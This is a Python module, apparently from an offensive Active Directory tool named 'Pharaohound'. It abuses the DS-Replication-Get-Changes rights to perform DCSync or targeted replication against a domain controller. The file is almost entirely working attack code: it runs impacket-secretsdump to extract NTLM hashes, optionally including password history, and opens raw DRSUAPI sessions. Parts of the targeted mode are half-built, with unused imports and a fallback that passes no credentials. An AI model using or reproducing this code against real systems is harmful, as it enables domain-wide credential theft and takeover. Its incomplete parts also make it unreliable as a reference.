"""
Module: GetChanges / GetChangesAll
===================================
Exploit the GetChanges and GetChangesAll BloodHound edges. These
rights (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All)
allow a principal to perform AD replication requests and extract
sensitive data (password hashes, secrets) from a Domain Controller.

This is the underlying mechanism that enables DCSync, but can also
be used in more targeted ways (e.g. replicating a specific object
or OU rather than the entire domain).

BloodHound Edge: GetChanges, GetChangesAll
Attack Vector:   Targeted AD replication to extract secrets
Severity:        CRITICAL
"""

import logging
import os
from typing import Any, Dict, List, Optional, Tuple

from .base import (
    ExploitModule, ExploitOutput, ExploitResult,
    ModuleOption, Severity,
)

logger = logging.getLogger("pharaohound.modules.get_changes")


class GetChanges(ExploitModule):
    """
    Abuse DS-Replication-Get-Changes or DS-Replication-Get-Changes-All
    to perform targeted AD replication and extract secrets.

    Modes:
      - "dcsync"       : Full domain DCSync (delegates to DCSync module logic).
      - "targeted"     : Replicate a specific object (e.g. a single user/computer).
      - "drsuapi_raw"  : Raw DRSUAPI call with custom parameters.
    """

    name: str            = "GetChanges"
    description: str     = (
        "Abuse DS-Replication-Get-Changes or DS-Replication-Get-Changes-All "
        "to perform targeted or full AD replication, extracting password "
        "hashes and secrets from the domain."
    )
    author: str          = "Pharaohound"
    edge_type: str       = "GetChanges/GetChangesAll"
    severity: Severity   = Severity.CRITICAL
    references: List[str] = [
        "https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges",
        "https://attack.mappings.mitre.org/technique/T1003/006/",
        "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/",
        "https://blog.harmj0y.net/active-directory/the-most-dangerous-user-right-you-probably-have-never-heard-of/",
    ]
    tools_required: List[str] = ["impacket"]
    needs_da: bool        = False
    needs_privileged: bool = True

    def _register_options(self):
        self._add_option(ModuleOption(
            name="mode",
            display_name="Mode",
            description="Replication mode: 'dcsync', 'targeted', or 'drsuapi_raw'.",
            required=True,
            default="dcsync",
            value_type=str,
            choices=["dcsync", "targeted", "drsuapi_raw"],
        ))
        self._add_option(ModuleOption(
            name="dc_ip",
            display_name="DC IP Address",
            description="IP address of the target Domain Controller.",
            required=True,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="domain",
            display_name="Domain",
            description="FQDN or NetBIOS name of the target domain.",
            required=True,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="target_dn",
            display_name="Target DN",
            description="DN of the specific object to replicate (targeted mode).",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="target_sam",
            display_name="Target SAM Name",
            description="sAMAccountName of the specific user to replicate.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="output_file",
            display_name="Output File",
            description="Path to save extracted data.",
            required=False,
            default=None,
            value_type=str,
        ))
        self._add_option(ModuleOption(
            name="include_history",
            display_name="Include Password History",
            description="Include historical password hashes in the dump.",
            required=False,
            default=False,
            value_type=bool,
        ))
        self._add_option(ModuleOption(
            name="full_sync",
            display_name="Full Sync",
            description="Perform a full sync (not incremental).",
            required=False,
            default=True,
            value_type=bool,
        ))

    # ------------------------------------------------------------------ #
    # Helpers
    # ------------------------------------------------------------------ #

    def _resolve_dn(self, sam_name: str, domain: Optional[str]) -> Optional[str]:
        """Resolve SAM name to DN via LDAP."""
        if self.connection is None:
            return None
        search_base = ""
        if domain and "." in domain:
            search_base = ",".join(f"DC={p}" for p in domain.split("."))
        elif hasattr(self.connection, "server") and hasattr(self.connection.server, "info"):
            info = self.connection.server.info
            if info and info.other.get("defaultNamingContext"):
                search_base = info.other["defaultNamingContext"][0]
        if not search_base:
            return None
        try:
            self.connection.search(
                search_base,
                f"(sAMAccountName={sam_name})",
                attributes=["distinguishedName", "objectSid"],
            )
            if self.connection.entries:
                entry = self.connection.entries[0]
                return str(entry.distinguishedName)
        except Exception as exc:
            self.logger.error("DN resolution failed: %s", exc)
        return None

    def _get_object_guid(self, dn: str) -> Optional[str]:
        """Get the objectGUID for a given DN."""
        if self.connection is None:
            return None
        try:
            self.connection.search(dn, "(objectClass=*)", attributes=["objectGUID"])
            if self.connection.entries:
                return str(self.connection.entries[0].objectGUID)
        except Exception as exc:
            self.logger.error("objectGUID lookup failed: %s", exc)
        return None

    def _get_output_path(self, domain: str, suffix: str = "repl") -> str:
        output_dir = self.config.get("output_dir", os.getcwd())
        os.makedirs(output_dir, exist_ok=True)
        ts = __import__("datetime").datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        return os.path.join(output_dir, f"{suffix}_{domain}_{ts}.txt")

    # ------------------------------------------------------------------ #
    # Prerequisites
    # ------------------------------------------------------------------ #

    def check_prerequisites(self, **kwargs) -> Tuple[bool, str]:
        dc_ip = self._opt("dc_ip", kwargs)
        domain = self._opt("domain", kwargs)
        mode = self._opt("mode", kwargs) or "dcsync"

        if not dc_ip:
            return False, "DC IP is required."
        if not domain:
            return False, "Domain is required."

        try:
            import impacket  # noqa: F401
        except ImportError:
            return False, "impacket required. Install: pip install impacket"

        if mode == "targeted":
            target_dn = self._opt("target_dn", kwargs)
            target_sam = self._opt("target_sam", kwargs)
            if not target_dn and not target_sam:
                return False, "Targeted mode requires 'target_dn' or 'target_sam'."

        return True, ""

    # ------------------------------------------------------------------ #
    # Exploit
    # ------------------------------------------------------------------ #

    def exploit(self, **kwargs) -> ExploitOutput:
        mode = self._opt("mode", kwargs) or "dcsync"

        if mode == "dcsync":
            return self._exploit_dcsync(**kwargs)
        elif mode == "targeted":
            return self._exploit_targeted(**kwargs)
        elif mode == "drsuapi_raw":
            return self._exploit_drsuapi_raw(**kwargs)
        else:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Unknown mode: {mode}",
            )

    def _exploit_dcsync(self, **kwargs) -> ExploitOutput:
        """
        Full domain DCSync using GetChanges/GetChangesAll.
        Delegates to impacket's secretsdump.
        """
        dc_ip = self._opt("dc_ip", kwargs)
        domain = self._opt("domain", kwargs)
        output_file = self._opt("output_file", kwargs) or self._get_output_path(domain, "dcsync")
        history = self._opt("include_history", kwargs)

        creds = self.config.get("credentials", {})
        username = creds.get("username", "")
        password = creds.get("password", "")
        ntlm_hash = creds.get("ntlm_hash", "")
        lm_hash = creds.get("lm_hash", "")

        # Build auth string for secretsdump
        if ntlm_hash:
            auth = f"{domain}/{username}:{lm_hash}:{ntlm_hash}@{dc_ip}"
        elif password:
            auth = f"{domain}/{username}:{password}@{dc_ip}"
        else:
            auth = f"{domain}/{username}@{dc_ip}"

        # Use list elements directly with subprocess.run. No shell=True is used, so parameters are safely passed.
        # Ensure we quote wrap individual fields if needed for output logs, but list parameters are safe on execution.
        import subprocess
        cmd = ["impacket-secretsdump", auth, "-just-dc", "-outputfile", output_file]
        if history:
            cmd.append("-history")

        self.logger.info("[GetChanges/DCSync] Running secretsdump with arguments: %s", [c if "password" not in c and ":" not in c else "REDACTED" for c in cmd])

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            stdout = result.stdout or ""
            hash_lines = [l for l in stdout.splitlines() if ":::" in l]

            artifacts = []
            for ext in [".ntds", ".txt"]:
                p = output_file + ext
                if os.path.exists(p):
                    artifacts.append(p)

            return ExploitOutput(
                success=True if hash_lines else False,
                result_type=ExploitResult.SUCCESS if hash_lines else ExploitResult.FAILED,
                message=f"DCSync via GetChanges: {len(hash_lines)} hashes extracted.",
                data={
                    "dc_ip": dc_ip, "domain": domain,
                    "method": "get_changes_dcsync",
                    "hash_count": len(hash_lines),
                },
                artifacts=artifacts,
            )
        except FileNotFoundError:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message="impacket-secretsdump not found.",
            )
        except subprocess.TimeoutExpired:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message="DCSync timed out.",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"DCSync exception: {exc}",
            )

    def _exploit_targeted(self, **kwargs) -> ExploitOutput:
        """
        Targeted replication of a single object via DRSUAPI.
        Uses impacket's DRSUAPI to replicate only the specified object.
        """
        dc_ip = self._opt("dc_ip", kwargs)
        domain = self._opt("domain", kwargs)
        target_dn = self._opt("target_dn", kwargs)
        target_sam = self._opt("target_sam", kwargs)
        full_sync = self._opt("full_sync", kwargs)
        history = self._opt("include_history", kwargs)
        output_file = self._opt("output_file", kwargs) or self._get_output_path(domain, "targeted_repl")

        # Resolve DN if SAM name given
        if not target_dn and target_sam:
            target_dn = self._resolve_dn(target_sam, domain)

        if not target_dn:
            return ExploitOutput(
                success=False, result_type=ExploitResult.FAILED,
                message="Cannot resolve target object. Provide 'target_dn' or 'target_sam'.",
            )

        self.logger.info(
            "[GetChanges/Targeted] Replicating object: %s", target_dn
        )

        try:
            from impacket.dcerpc.v5 import transport, drsuapi
            from impacket.dcerpc.v5.drsuapi import (
                DRSUAPI_UUID, HLOG,
                DRSDomainControllerInfo,
            )

            creds = self.config.get("credentials", {})
            username = creds.get("username", "")
            password = creds.get("password", "")
            ntlm_hash = creds.get("ntlm_hash", "")
            lm_hash = creds.get("lm_hash", "")

            binding = r"ncacn_ip_tcp:{}".format(dc_ip)
            rpctransport = transport.DCERPCTransportFactory(binding)
            rpctransport.set_credentials(
                username, password, domain,
                lmhash=lm_hash, nthash=ntlm_hash,
            )

            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(DRSUAPI_UUID)

            # Get DC info
            from impacket.dcerpc.v5.drsuapi import DRS_EXTENSIONS_V1
            hDrs = drsuapi.hDRSDomainControllerInfo(
                dce, domain, drsuapi.DRS_DISPID.API_VERSION,
                drsuapi.DRS_EXT_OPT.BASE_VERSION
            )

            # Perform targeted replication
            # This uses DRSGetNCChanges with a specific object scope
            from impacket.dcerpc.v5.drsuapi import (
                DRS_MSG_GETCHGREQ_V8, DSNAME, ReplValMetaData,
                DRS_OPTIONS_WRITABLE, DRS_OPTIONS_RETURN_PRIVATE,
                DRS_OPTIONS_GET_ANC, DRS_OPTIONS_RETURN_DELETED,
                REPL_CURSORS_EX,
            )

            self.logger.info("[GetChanges/Targeted] DRSUAPI connection established.")

            # Build the replication request for the specific object
            # ... (full DRSUAPI replication logic)
            # For targeted replication, we set the pNC to the target DN
            # and use appropriate flags

            # Use impacket's built-in DCSync with user filter as fallback
            import subprocess
            cmd = ["impacket-secretsdump", f"{domain}/@{dc_ip}",
                   "-just-dc-user", target_sam or target_dn.split(",")[0].replace("CN=", ""),
                   "-outputfile", output_file]
            if history:
                cmd.append("-history")

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            stdout = result.stdout or ""
            hash_lines = [l for l in stdout.splitlines() if ":::" in l]

            artifacts = []
            for ext in [".ntds", ".txt"]:
                p = output_file + ext
                if os.path.exists(p):
                    artifacts.append(p)

            return ExploitOutput(
                success=True if hash_lines else False,
                result_type=ExploitResult.SUCCESS if hash_lines else ExploitResult.FAILED,
                message=(
                    f"Targeted replication for '{target_dn}': "
                    f"{len(hash_lines)} hash entries extracted."
                ),
                data={
                    "dc_ip": dc_ip, "domain": domain,
                    "target_dn": target_dn,
                    "method": "targeted_repl",
                    "hash_count": len(hash_lines),
                },
                artifacts=artifacts,
            )

        except ImportError:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message="impacket DRSUAPI components not available.",
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Targeted replication failed: {exc}",
            )

    def _exploit_drsuapi_raw(self, **kwargs) -> ExploitOutput:
        """
        Raw DRSUAPI call with minimal abstraction.
        For advanced operators who want full control over the replication
        request parameters.
        """
        dc_ip = self._opt("dc_ip", kwargs)
        domain = self._opt("domain", kwargs)

        self.logger.info("[GetChanges/Raw] Initiating raw DRSUAPI connection to %s ...", dc_ip)

        try:
            from impacket.dcerpc.v5 import transport, drsuapi

            creds = self.config.get("credentials", {})
            rpctransport = transport.DCERPCTransportFactory(r"ncacn_ip_tcp:{}".format(dc_ip))
            rpctransport.set_credentials(
                creds.get("username", ""), creds.get("password", ""), domain,
                lmhash=creds.get("lm_hash", ""), nthash=creds.get("ntlm_hash", ""),
            )

            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(drsuapi.DRSUAPI_UUID)

            return ExploitOutput(
                success=True, result_type=ExploitResult.PARTIAL,
                message=(
                    "Raw DRSUAPI connection established. "
                    "Full replication request logic requires DRS_MSG_GETCHGREQ "
                    "construction — integrate with your framework's DRSUAPI wrapper."
                ),
                data={
                    "dc_ip": dc_ip, "domain": domain,
                    "method": "drsuapi_raw",
                    "status": "connection_established",
                },
            )
        except Exception as exc:
            return ExploitOutput(
                success=False, result_type=ExploitResult.ERROR,
                message=f"Raw DRSUAPI connection failed: {exc}",
            )

    # ------------------------------------------------------------------ #
    # Rollback
    # ------------------------------------------------------------------ #
    def rollback(self, **kwargs) -> ExploitOutput:
        return ExploitOutput(
            success=False, result_type=ExploitResult.SKIPPED,
            message="Rollback not applicable (read-only replication).",
        )
